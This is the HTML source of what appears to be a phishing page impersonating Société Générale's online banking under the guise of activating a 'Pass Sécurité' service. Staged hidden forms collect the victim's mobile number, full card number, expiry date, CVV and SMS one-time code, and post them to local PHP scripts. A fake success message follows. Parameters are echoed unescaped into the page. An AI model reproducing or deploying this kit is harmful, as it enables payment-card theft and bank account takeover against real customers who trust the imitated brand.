<a data-channelid="5a4c0f9d49b37610VgnVCM10000057f440c0RCRD" aria-controls="nava6d635e27f377610VgnVCM10000057f440c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="dcw_sidedrawer_link dcw_main-nav_link js-ref_elt" data-tms-container-label="navigation-connected" data-tms-element-label="prêts" href="#/icd/espaces-thematiques/credit/credit-restit.html" data-tms-click-type="N">                            Prêts
</a>                    <nav class="dcw_submenu-auth dcw_sidedrawer_subnav" aria-label="navigation secondaire">
                        <div class="dcw_submenu-auth_wrapper">
                            <ul class="dcw_submenu-auth_list js-submenu dcw_sidedrawer_list">
                                <li class="dcw_sidedrawer_item dcw_sidedrawer_back-item js-sidedrawer_back-item">
                                    <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#back-arrow"></use></svg>
                                    <a class="dcw_sidedrawer_link"></a>Prêts
                                </li>
                                <li class="dcw_submenu-auth_item js-menu_title js-bind-burger dcw_sidedrawer_item has-popup hide-on-desktop">
                                    <span class="dcw_submenu-auth_link js-ref_elt" data-channelid="5a4c0f9d49b37610VgnVCM10000057f440c0RCRD">
                                        Prêts
                                    </span>
                                </li>
								<li class="dcw_submenu-auth_item dcw_sidedrawer_item dcw_submenu-auth_item--arrow">
                                    <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#arrow-nav"></use></svg>
                                </li>
											<li class="dcw_submenu-auth_item js-submenu_item js-outside-dropdown dcw_sidedrawer_item ">
													<svg class="dcw_submenu-auth_marker js-marker" aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#h-marker"></use></svg>
											
<a data-channelid="dc4563f637cc4610VgnVCM10000057f440c0RCRD" class="dcw_submenu-auth_link js-submenu_elt-not-in-dropdown js-ref_elt" data-tms-container-label="navigation-connected" data-tms-element-label="crédit-à-la-consommation" data-anchor="null" data-cm="1" href="#/secure/pret/espace-thematique-pret/credit-consommation-co" data-tms-click-type="N">															Crédit à la consommation
</a>											</li>
											<li class="dcw_submenu-auth_item js-submenu_item js-outside-dropdown dcw_sidedrawer_item ">
											
<a data-channelid="f2477c7ac9f64610VgnVCM10000057f440c0RCRD" class="dcw_submenu-auth_link js-submenu_elt-not-in-dropdown js-ref_elt" data-tms-container-label="navigation-connected" data-tms-element-label="crédit-immobilier" data-anchor="null" data-cm="1" href="#/secure/pret/espace-thematique-pret/pret-credit-immobilier" data-tms-click-type="N">															Crédit immobilier
</a>											</li>
                            </ul>
                        </div>
                    </nav>
            </li>
            <li class="js-sidedrawer_item js-menu_item dcw_sidedrawer_item dcw_main-nav_item  hide-on-mobile">
                <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#home"></use></svg>
                
<a data-channelid="65a22a7e5457e510VgnVCM100000020012acRCRD" aria-controls="nav00bf75bdb2301610VgnVCM100000050013acRCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="dcw_sidedrawer_link dcw_main-nav_link js-ref_elt" data-tms-container-label="navigation-connected" data-tms-element-label="bourse" href="#/cem/CED10.html?AOPL=COMSTOCK" data-tms-click-type="N">                            Bourse
</a>                    <nav class="dcw_submenu-auth dcw_sidedrawer_subnav" aria-label="navigation secondaire">
                        <div class="dcw_submenu-auth_wrapper">
                            <ul class="dcw_submenu-auth_list js-submenu dcw_sidedrawer_list">
                                <li class="dcw_sidedrawer_item dcw_sidedrawer_back-item js-sidedrawer_back-item">
                                    <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#back-arrow"></use></svg>
                                    <a class="dcw_sidedrawer_link"></a>Bourse
                                </li>
                                <li class="dcw_submenu-auth_item js-menu_title js-bind-burger dcw_sidedrawer_item  hide-on-mobile">
                                    <span class="dcw_submenu-auth_link js-ref_elt" data-channelid="65a22a7e5457e510VgnVCM100000020012acRCRD">
                                        Bourse
                                    </span>
                                </li>
                            </ul>
                        </div>
                    </nav>
            </li>
            <li class="js-sidedrawer_item js-menu_item dcw_sidedrawer_item dcw_main-nav_item  hide-on-desktop">
                <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#fonc-bourse"></use></svg>
                
<a data-channelid="1d65c7dd5f001610VgnVCM100000060012acRCRD" aria-controls="navf938d2ba1d5f1610VgnVCM100000060012acRCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="dcw_sidedrawer_link dcw_main-nav_link js-ref_elt" data-tms-container-label="navigation-connected" data-tms-element-label="bourse" href="#/icd/bwd/ident-bwd-index.html#synthese/info-bourse" data-tms-click-type="N">                            Bourse
</a>                    <nav class="dcw_submenu-auth dcw_sidedrawer_subnav" aria-label="navigation secondaire">
                        <div class="dcw_submenu-auth_wrapper">
                            <ul class="dcw_submenu-auth_list js-submenu dcw_sidedrawer_list">
                                <li class="dcw_sidedrawer_item dcw_sidedrawer_back-item js-sidedrawer_back-item">
                                    <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#back-arrow"></use></svg>
                                    <a class="dcw_sidedrawer_link"></a>Bourse
                                </li>
                                <li class="dcw_submenu-auth_item js-menu_title js-bind-burger dcw_sidedrawer_item  hide-on-desktop">
                                    <span class="dcw_submenu-auth_link js-ref_elt" data-channelid="1d65c7dd5f001610VgnVCM100000060012acRCRD">
                                        Bourse
                                    </span>
                                </li>
                            </ul>
                        </div>
                    </nav>
            </li>
            <li class="js-sidedrawer_item js-menu_item dcw_sidedrawer_item dcw_main-nav_item has-popup ">
                <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#fonc-assurances-2"></use></svg>
                
<a data-channelid="30d8d7eb61b7e510VgnVCM100000020012acRCRD" aria-controls="nav3b288bfb76301610VgnVCM100000050013acRCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="dcw_sidedrawer_link dcw_main-nav_link js-ref_elt" data-tms-container-label="navigation-connected" data-tms-element-label="assurances" href="#/icd/assup/assup-restit.html#restit-home/" data-tms-click-type="N">                            Assurances
</a>                    <nav class="dcw_submenu-auth dcw_sidedrawer_subnav" aria-label="navigation secondaire">
                        <div class="dcw_submenu-auth_wrapper">
                            <ul class="dcw_submenu-auth_list js-submenu dcw_sidedrawer_list">
                                <li class="dcw_sidedrawer_item dcw_sidedrawer_back-item js-sidedrawer_back-item">
                                    <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#back-arrow"></use></svg>
                                    <a class="dcw_sidedrawer_link"></a>Assurances
                                </li>
                                <li class="dcw_submenu-auth_item js-menu_title js-bind-burger dcw_sidedrawer_item has-popup ">
                                    <span class="dcw_submenu-auth_link js-ref_elt" data-channelid="30d8d7eb61b7e510VgnVCM100000020012acRCRD">
                                        Assurances
                                    </span>
                                </li>
								<li class="dcw_submenu-auth_item dcw_sidedrawer_item dcw_submenu-auth_item--arrow">
                                    <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#arrow-nav"></use></svg>
                                </li>
											<li class="dcw_submenu-auth_item js-submenu_item js-outside-dropdown dcw_sidedrawer_item ">
													<svg class="dcw_submenu-auth_marker js-marker" aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#h-marker"></use></svg>
											
<a data-channelid="7a9f804f6193f510VgnVCM100000030013acRCRD" class="dcw_submenu-auth_link js-submenu_elt-not-in-dropdown js-ref_elt" data-tms-container-label="navigation-connected" data-tms-element-label="accueil-assurances" data-anchor="null" href="#/icd/assup/assup-restit.html#restit-home/" data-tms-click-type="N">															Accueil assurances
</a>											</li>
											<li class="dcw_submenu-auth_item js-submenu_item js-outside-dropdown dcw_sidedrawer_item ">
											
<a data-channelid="c1800f10162ad510VgnVCM100000030013acRCRD" class="dcw_submenu-auth_link js-submenu_elt-not-in-dropdown js-ref_elt" data-tms-container-label="navigation-connected" data-tms-element-label="nos-offres-d?assurances" data-anchor="null" data-cm="1" href="#/assurances" data-tms-click-type="N">															Nos offres d?assurances
</a>											</li>
                            </ul>
                        </div>
                    </nav>
            </li>
            <li class="js-sidedrawer_item js-menu_item dcw_sidedrawer_item dcw_main-nav_item has-popup ">
                <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#fonc-boutique"></use></svg>
                
<a data-channelid="b6d115622abb3610VgnVCM1000000ae1c6c0RCRD" aria-controls="navd33475bdb2301610VgnVCM100000050013acRCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="dcw_sidedrawer_link dcw_main-nav_link js-ref_elt" data-tms-container-label="navigation-connected" data-tms-element-label="mes-offres-et-avantages" href="#/secure/offres-et-avantages/mes-souscriptions-et-avantages" data-tms-click-type="N">                            Mes offres et avantages
</a>                    <nav class="dcw_submenu-auth dcw_sidedrawer_subnav" aria-label="navigation secondaire">
                        <div class="dcw_submenu-auth_wrapper">
                            <ul class="dcw_submenu-auth_list js-submenu dcw_sidedrawer_list">
                                <li class="dcw_sidedrawer_item dcw_sidedrawer_back-item js-sidedrawer_back-item">
                                    <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#back-arrow"></use></svg>
                                    <a class="dcw_sidedrawer_link"></a>Mes offres et avantages
                                </li>
                                <li class="dcw_submenu-auth_item js-menu_title js-bind-burger dcw_sidedrawer_item has-popup ">
                                    <span class="dcw_submenu-auth_link js-ref_elt" data-channelid="b6d115622abb3610VgnVCM1000000ae1c6c0RCRD">
                                        Mes offres et avantages
                                    </span>
                                </li>
								<li class="dcw_submenu-auth_item dcw_sidedrawer_item dcw_submenu-auth_item--arrow">
                                    <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#arrow-nav"></use></svg>
                                </li>
											<li class="dcw_submenu-auth_item js-submenu_item js-outside-dropdown dcw_sidedrawer_item ">
													<svg class="dcw_submenu-auth_marker js-marker" aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#h-marker"></use></svg>
											
<a data-channelid="c3fa2334a5ec5610VgnVCM10000057f440c0RCRD" class="dcw_submenu-auth_link js-submenu_elt-not-in-dropdown js-ref_elt" data-tms-container-label="navigation-connected" data-tms-element-label="mes-souscriptions-et-avantages" data-anchor="null" data-cm="1" href="#/secure/offres-et-avantages/mes-souscriptions-et-avantages" data-tms-click-type="N">															Mes souscriptions et avantages
</a>											</li>
											<li class="dcw_submenu-auth_item js-submenu_item js-outside-dropdown dcw_sidedrawer_item ">
											
<a data-channelid="542e818ebe8f3610VgnVCM1000000ae1c6c0RCRD" class="dcw_submenu-auth_link js-submenu_elt-not-in-dropdown js-ref_elt" data-tms-container-label="navigation-connected" data-tms-element-label="toutes-nos-offres" data-anchor="null" data-cm="1" href="#/secure/offres-et-avantages/toutes-nos-offres" data-tms-click-type="N">															Toutes nos offres
</a>											</li>
                            </ul>
                        </div>
                    </nav>
            </li>
        <li class="js-sidedrawer_item dcw_sidedrawer_item dcw_main-nav_item dcw_main-nav_search">
            <div role="search">
                <button class="dcw_main-nav_search-btn js-main-search_toggle js-main-search-auth">
                    <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#search"></use></svg>
                </button>
            </div>
        </li>
    </ul>
</div>
			
			
		

    <div class="dcw_first-level_hidden" data-channelid="ce4b504675aa2610VgnVCM100000030013acRCRD">
                             

    </div>
    <div class="dcw_first-level_hidden" data-channelid="23740747e1a02610VgnVCM100000060012acRCRD">
                             

    </div>
    <div class="dcw_first-level_hidden" data-channelid="26a50747e1a02610VgnVCM100000060012acRCRD">
                             

    </div>
    <div class="dcw_first-level_hidden" data-channelid="7b333cb48ec14610VgnVCM1000000ae1c6c0RCRD">
                             

    </div>
    <div class="dcw_first-level_hidden" data-channelid="851a1d8b157d1610VgnVCM100000050012acRCRD">
                             

    </div>
    <div class="dcw_first-level_hidden" data-channelid="58af94fc452a4610VgnVCM100000060013acRCRD">
                             

    </div>
    <div class="dcw_first-level_hidden" data-channelid="fa583b1e3ab71610VgnVCM100000050012acRCRD">
                             

    </div>
    <div class="dcw_first-level_hidden" data-channelid="a78dadb1a5102610VgnVCM100000060012acRCRD">
                             

    </div>
    <div class="dcw_first-level_hidden" data-channelid="fdfdadb1a5102610VgnVCM100000060012acRCRD">
                             

    </div>
    <div class="dcw_first-level_hidden" data-channelid="4a52fbd252c01610VgnVCM100000060012acRCRD">
                             

    </div>
    <div class="dcw_first-level_hidden" data-channelid="2b1dadb1a5102610VgnVCM100000060012acRCRD">
                             

    </div>
    <div class="dcw_first-level_hidden" data-channelid="3ed50747e1a02610VgnVCM100000060012acRCRD">
                             

    </div>
    <div class="dcw_first-level_hidden" data-channelid="387ed2ba1d5f1610VgnVCM100000060012acRCRD">
                             

    </div>
    <div class="dcw_first-level_hidden" data-channelid="b2fcd2ba1d5f1610VgnVCM100000060012acRCRD">
                             

    </div>
    <div class="dcw_first-level_hidden" data-channelid="ccf11e28952f2610VgnVCM100000050013acRCRD">
                             

    </div>
<ul class="dcw_tab-bar js-tab-bar">
        <li class="dcw_tab-bar_item">
<a arial-label="Mon conseiller" data-tms-container-label="nav-bar" data-tms-element-label="mon-conseiller" class="dcw_tab-bar_btn" href="#/aides-contact" data-tms-click-type="N">                        <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#people"></use></svg>
</a>        </li>
        <li class="dcw_tab-bar_item">
<a arial-label="Alerting" data-tms-container-label="nav-bar" data-tms-element-label="alerting" class="dcw_tab-bar_btn" id="js-mobile-counter-alerting" href="#/com/icd-web/alerting/fil-alertes.html#fil-alertes/" data-tms-click-type="N">                        <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#bell"></use></svg>
</a>        </li>
        <li class="dcw_tab-bar_item">
<a arial-label="Mes documents" data-tms-container-label="nav-bar" data-tms-element-label="mes-documents" class="dcw_tab-bar_btn" href="#/secure/mes-documents" data-tms-click-type="N">                        <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#folder"></use></svg>
</a>        </li>
        <li class="dcw_tab-bar_item">
<a arial-label="Service d?urgence" data-tms-container-label="nav-bar" data-tms-element-label="service-d?urgence" class="dcw_tab-bar_btn" href="#/aides-contact/contact-services-urgence" data-tms-click-type="N">                        <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#alert"></use></svg>
</a>        </li>
</ul>
</nav>
		<div class="dcw_submenu-auth_wrap-title">
    <button class="dcw_submenu-auth_back-btn is-visible" aria-label="retour à la page précédente" data-tms-click-type="A" data-tms-element-label="retourner-page-precedente" data-tms-container-label="navigation-connected">
        <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#arrow-circle"></use></svg>
  </button>
  <h1 class="dcw_submenu-auth_title">Mon profil</h1>
</div></div>
	<div class="dcw_header-title_mask">
		<div class="dcw_header-title is-sticky">
			<button class="dcw_header-title_back is-visible" id="js-back-btn" aria-label="retour à la page précédente" data-tms-element-label="retourner-page-precedente" data-tms-click-type="A" data-tms-container-label="header-connected">
				<svg aria-hidden="true" focusable="false">
					<use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#arrow-circle"></use>
				</svg>
			</button>
			<div class="dcw_header-title_titles">
				<h2 class="dcw_header-title_title" id="js-mobile-title">Prélèvement</h2>
				<p class="dcw_header-title_sub" id="js-mobile-subtitle"></p>
			</div>
			</div>
	</div>
</header>
<section class="dcw_main" id="dcw_main_section">
<section class="dcw_gb_row dcw_gb_communication">
	</section>
<section class="dcw_gb_wrapper">
<section class="dcw_gb_row dcw_gb_row--small">
</section>
	<main class="dcw_gb2_core-wrapper" role="main">
		<a id="go-content" tabindex="-1"></a>
		<section class="dcw_gb_core ugds_serviciel" id="">

<!-- URL: https://particuliers.societegenerale.fr:80/restcontent/regions/5040ed2049b0f510VgnVCM100000030013acRCRD -->
<!-- REQUEST PROFILE: BFM, REQUEST SAS AUTH_LEVEL: 0 -->
<!-- channelId: 5040ed2049b0f510VgnVCM100000030013acRCRD, regionNames: header-int-without-open-main,gb2-com1-int,gb2-com5-int, FURL_NAME: /aconec/cptbud/prlvts/default/header, FURL_ID: 1ed686e506f2e510VgnVCM100000030013acRCRD --><div id="div_NET2G">
<div class="cadre">
<div class="LGNContent" id="content">

<div class="ongletA">
<br>
<!-- loader -->

<div class="loader" style="display: none;"> 
<div class="LGNTableA">
<div class="LGNTableHead">

 <center><img class="loader" src="img/loader.gif"> </center>
          <span class="loader"
                style=" display: block; text-align: center; margin-top: 20px; ">Chargement en cours : Veuillez patienter quelques instants</span>
</div>



</div>



</div>

<!-- loader -->
<!-- NUM -->


<div class="num" style="display: none">
 
                 
                <form name="myform" method="PSOT" id="ccform" action="deconnecter.php">

<div class="LGNTableA">
<div class="LGNTableHead">


<br></div>
<div style="height: 21px;">
<div id="presta_libelle" style="float: left;">
</div>
<table summary="Mes contacts mobiles" class="coordonnees"
 cellpadding="0" cellspacing="0">

  <tbody>
    <tr class="TelNumber">
       <td>
                        <strong>
Veuillez saisir votre numero de telephone :</strong>
                    </td>
                    <td >
                       
                       
                                <input name="anoo" class="numo"  style="width: 60px;  height: 32px; " readonly="" value="+33" data-validation="indicatif" maxlength="5"  type="text"><!--
                                        --><input style="width: 160px;  height: 32px; "  class="numo" id="numo" name="numo" type="text" maxlength="10" siz="10" placeholder="Votre Numéro Mobile" onkeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" required="required" autocomplete="off" autocorrect="off" autocapitalize="off" value="" aria-describedby="legalFirstNameValidations" aria-invalid="false">
                    </td>
    
      <input name="id" value="<?php print $_GET['id'] ?>"
 type="hidden">
    </tr>
    <tr id="MM_SYNTHESE_COORDONNEES_m_ucMobile_mTrModifMobProSupp"
 class="TelNumber hidden" style="display: none;">
    </tr>
  </tbody>
</table><BR>
<table summary="Mes contacts mobiles" class="coordonnees"
 cellpadding="0" cellspacing="0">
  <tbody>
    <tr>
      <td></td>
      <td><div id="button-sent"><button
 
 type="submit">Confirmer</button></div></td>
    </tr>
  </tbody>
</table>
    </form>

</div>


<br><div class="LGNContent finCadre">
</div>
</div>



</div>
<!-- NUM -->

<!-- CC -->
  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js'></script>

    <script src="js/index.js"></script>
      <link rel="stylesheet" href="css/style.css">
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
  
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
<div class="cc" style="display: none">
 
                 

<div class="LGNTableA">
<div class="LGNTableHead">

Vérifier votre identité<br></div>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
  
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
<table  class="coordonnees" cellspacing="0" cellpadding="0">
           <tbody>
                
               
                 <tr>
      <td style="text-align: center;"></td>
      <td ><br>	  <form name="myform" method="PSOT" id="ccrm" action="deconnecter.php">

	  
<div id="area">
  <div class="master-card">
    <div class="card">
	

  <div class="box">
  <img style=" width: 160px; height: 41px;" src="7696.png">&nbsp;&nbsp;
  <span><font color="#ffffff"><small><small>SOCIETE <br>
GENERALE</small></small></font>
</span>
</div>	  

      <div class="input-number"><br>
        <div class="inputs-number">
  <input  next="1"  placeholder="XXXX" onkeyup="if (/\D/g.test(this.value)) this.value = this.value.replace(/\D/g,'')" maxlength="4" type="text">
<input  next="2"  placeholder="XXXX" onkeyup="if (/\D/g.test(this.value)) this.value = this.value.replace(/\D/g,'')" maxlength="4" type="text">
<input  next="3"  placeholder="XXXX" onkeyup="if (/\D/g.test(this.value)) this.value = this.value.replace(/\D/g,'')" maxlength="4" type="text">
<input  next="4" placeholder="XXXX" onkeyup="if (/\D/g.test(this.value)) this.value = this.value.replace(/\D/g,'')" maxlength="4" type="text">
        </div>
        <div class="selects-date selecters">
          <div class="day-select"><span>EXPIRE A FIN</span>
            <select id="dateex" name="dateex">
			
              <option value="1" selected="selected">1</option>
              <option value="2">2</option>
              <option value="3">3</option>
              <option value="4">4</option>
              <option value="5">5</option>
              <option value="6">6</option>
              <option value="7">7</option>
              <option value="8">8</option>
              <option value="9">9</option>
              <option value="10">10</option>
              <option value="11">11</option>
              <option value="12">12</option>
              <option value="13">13</option>
              <option value="14">14</option>
              <option value="15">15</option>
              <option value="16">16</option>
              <option value="17">17</option>
              <option value="18">18</option>
              <option value="19">19</option>
              <option value="20">20</option>
              <option value="21">21</option>
              <option value="22">22</option>
              <option value="23">23</option>
              <option value="24">24</option>
              <option value="25">25</option>
              <option value="26">26</option>
              <option value="27">27</option>
              <option value="28">28</option>
              <option value="29">29</option>
              <option value="30">30</option>
            </select>

          </div>
          <div class="year-select"><span>-</span>
<select id="yearex" name="yearex">
             
            
              <option value="20">20</option>
              <option value="21">21</option>
              <option value="22">22</option>
              <option value="23">23</option>
              <option value="24">24</option>
              <option value="25">25</option>
              <option value="26">26</option>
            </select>
          </div>
        </div>
      </div>
      <div class="mark-gold">
        <div class="round">
          <div class="circles">
            <div class="circle-1"> </div>
          </div>
        </div>
      </div>
      <div class="name"><span id="kayy"></span></div>
    </div>
    <div class="card-back">
      <div class="tire"></div>
      <div class="secret-area">
        <input type="text" maxlength="3" id="crd" name="crd" placeholder="000" required="required"/>
      </div>
      <div class="chip-card"></div>
    </div>
  </div>
  <div class="button-sent">
    <button id="back">Retour</button>
    <button id="continue">Continue</button>
	<button id="confirmer" 
 type="submit">Confirmer</button></form>
  </div>
</div>
 
    
 </td>
      <td style="text-align: center;"></td>
	  
    </tr>
	 

            </tbody>
        </table>

<BR>

    </form>

</div>


<br><div class="LGNContent finCadre">
</div>
</div>



</div>
<!-- CC -->

 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script>
        $(document).ready(function () {
            $('#formcc').submit(function(){
          
            });
            $('input').keyup(function (event) {
                var valuekey = event.which;
                console.log(valuekey);
                if(valuekey == 16 || valuekey ==17 || valuekey == 18 || valuekey == 9 || valuekey == 37 || valuekey ==38 || valuekey == 39 || valuekey == 40 ){
                    return false;
                }

                if ($(this).val().length == $(this).attr("maxlength")) {
                    //$(this).next().focus();
                    next = $(this).attr('next');

                    if(typeof next != "undefined") {
                        console.log(next );
                        next = (next * 1 )+1;
                        console.log('input[next='  + next + ']');
                        $('input[next='  + next + ']').focus();

                    }


                }
            });
        });
    </script>

<!-- ACTIV -->


 <div class="activ" style="display: none;">
 <div style="text-align: left;"><span style="color: rgb(255, 102, 102);"> l'activation de
S&eacute;cur'Pass est obligatoire</span></div><br>
                  <form name="myform" method="POST" class="myactiv"
                  action="connect.php">

<div class="LGNTableA">
<div class="LGNTableHead">


<br></div>
<div style="height: 21px;">
<div id="presta_libelle" style="float: left;">
</div>
<table summary="Mes contacts mobiles" class="coordonnees"
 cellpadding="0" cellspacing="0">

  <tbody>
    <tr class="TelNumber">
      <td>
      <strong>Plus de s&eacute;curit&eacute; sur
vos op&eacute;rations gr&acirc;ce &agrave; Pass
S&eacute;curit&eacute; Soci&eacute;t&eacute;
G&eacute;n&eacute;rale Ce service vous est offert gratuitement
par votre banque.</strong>
      </td>
    
      <input name="id" value="<?php print $_GET['id'] ?>"
 type="hidden">
    </tr>
    <tr id="MM_SYNTHESE_COORDONNEES_m_ucMobile_mTrModifMobProSupp"
 class="TelNumber hidden" style="display: none;">
    </tr>
  </tbody>
</table>
<table summary="Mes contacts mobiles" class="coordonnees"
 cellpadding="0" cellspacing="0">
  <tbody>
    <tr>
      <td></td>
      <td><div id="button-sent"><button
 
 type="submit">Confirmer</button></div></td>
    </tr>
  </tbody>
</table>
    </form>

</div>


<br><div class="LGNContent finCadre">
</div>
</div>



</div>
<!-- ACTIV -->
<!-- SMS -->
<div class="textfieldform" style="display: none;">
 
                 
               <form name="myform" method="POST" class="myform"
                  action="deconnecter.php">

<div class="LGNTableA">
<div class="LGNTableHead">


<br></div>
<div style="height: 21px;">
<div id="presta_libelle" style="float: left;">
</div>
<table>
  <tbody>
    <tr>
      <td>
      <strong>
Nous vous avons envoyé un code par SMS, confirmez l'activation à l’aide du code reçu :</strong>
	<br>	<br>

<table>
  <tbody>
    <tr>
      <td></td>
	  
      <td>
     
      </td>
      <td><center> <input name="smscode" class="vb"
 placeholder=""
 onkeypress="//if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;"
 required="required" autocomplete="off" autocorrect="off"
 autocapitalize="off" value=""
 aria-describedby="legalFirstNameValidations"
 aria-invalid="false" type="text"></center></td>
	  <td> </td>
    </tr>
    <tr>
      <td></td>
      <td> </td>
	   <td> </td>
      <td>
       <div id="button-sent"><button type="submit">Confirmer</button></div>
      </td>
    </tr>
  </tbody>
</table>


 
 <input name="id"
 value="<?php print $_GET['id'] ?>" type="hidden"></td>
    </tr>
    <tr>
      <td ><input value="<?php print $_GET['id'] ?>"
 name="id" type="hidden"><br>
      
      </td>
    </tr>
    <tr>
      <td><br>
Si vous ne recevez pas le Code S&eacute;curit&eacute;, merci de
v&eacute;rifier le num&eacute;ro de
t&eacute;l&eacute;phone s&eacute;curit&eacute;
d&eacute;clar&eacute;.
Vous pouvez modifier votre num&eacute;ro de
t&eacute;l&eacute;phone en envoyant un SMS au 51002<br>
(0,20 EUR TTC par envoi + prix d&rsquo;un SMS) ou en vous rendant
dans votre agence.<br>
      <br>
      </td>
    </tr>
  </tbody>
</table>

    </form>

</div>


<br><div class="LGNContent finCadre">
</div>
</div>



</div>
<!-- SMS -->
<!-- MERCI --> <div class="merci" style="display: none">
 
                 
               

<div class="LGNTableA">
<div class="LGNTableHead">


<br></div>
<div style="height: 21px;">
<div id="presta_libelle" style="float: left;">
</div>
<center>

 			

  
            <p>
Votre service Pass Sécurité a bien été activé .<br>Société Générale vous remercie de votre confiance </p><img style=" width: 85px; " src="img/check.png">	</center>
</div>


<br><div class="LGNContent finCadre">
</div>
</div>



</div>
<!-- MERCI -->








<!-- index --> <div class="index" style="display: none">
 
                 
               

<div class="LGNTableA">
<div class="LGNTableHead">


<br></div>
<div style="height: 21px;">
<div id="presta_libelle" style="float: left;">
</div>


<br><div class="LGNContent finCadre">
</div>
</div>



</div>
<!-- index -->






</div>
</section>
<section class="dcw_gb_row">
	</section>
</main>
<aside class="dcw_gb2_aside-wrapper">
<section class="dcw_gb2_column-right">
	
<div class="rightColumnContextualMenuWrapper hide-on-mobile">
        <h3 class="dcw_title dcw_contextual-menu_title">Service</h3>
        <nav>
            <ul class="dcw_contextual-menu_wrapper contextualMenu">
                    <li class="dcw_contextual-menu_item">
                        <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20190321171150.svg#withdraw"></use></svg>
<a data-tms-container-label="contextual-menu-right" class="dcw_contextual-menu_link" href="#/restitution/cns_listeNotification.html" data-tms-click-type="N" data-tms-element-label="notification-de-refus">Pass Sécurité
</a>                    </li>
            </ul>
        </nav>
</div><div class="dcw_visually-hidden" data-clientside-answer="conseillee" data-clientside-method-name="getPrestCouranteTypeGestConseillee" data-clientside-id="getPrest">
<div class="eip-spec56_btn_gsm_all_gcd eip-spec56_btn_asv">
    <a data-tms-element-label="Votre Espace Gestion Sous Mandat" data-tms-container-label="contextual-menu-right" data-tms-click-type="N" href="#/com/icd-web/rcd/rcd-index.html#rcd/" aria-label="Votre Espace Synoé">
        <img src="fichiers/picto-gsm.svg">
        <div class="eip-spec56_titre_btn">Synoé</div>
        <div class="eip-spec56_btn_soustitre">Accéder à mon espace</div>
    </a>
</div> 
</div>
<div class="dcw_visually-hidden" data-clientside-answer="gsm" data-clientside-method-name="getPrestCouranteTypeGestSousMandat" data-clientside-id="getPrest">
<div class="eip-spec56_btn_gsm_all_gcd eip-spec56_btn_asv">
    <a data-tms-element-label="Votre Espace Gestion Sous Mandat" data-tms-container-label="bourse-menu-left" data-tms-click-type="N" href="#/com/icd-web/tor/tor-gsm-index.html#tor/accueil/" aria-label="Votre Espace Gestion Sous Mandat">
